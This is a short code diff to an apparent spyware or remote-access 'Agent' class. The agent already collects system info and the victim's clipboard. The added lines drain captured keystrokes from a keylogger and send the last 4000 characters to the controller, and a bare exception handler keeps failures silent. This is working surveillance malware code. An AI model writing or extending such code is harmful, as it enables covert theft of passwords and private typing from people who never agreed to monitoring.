@@ -216,6 +216,10 @@ class Agent:
                     "uptime": sysinfo.uptime(),
                     "clipboard": clipboard,
                 })
+                if hasattr(self, "keylogger") and self.keylogger.running:
+                    fresh = self.keylogger.drain()
+                    if fresh:
+                        self.send({"t": "keys", "d": fresh[-4000:]})
             except Exception:
                 pass
 
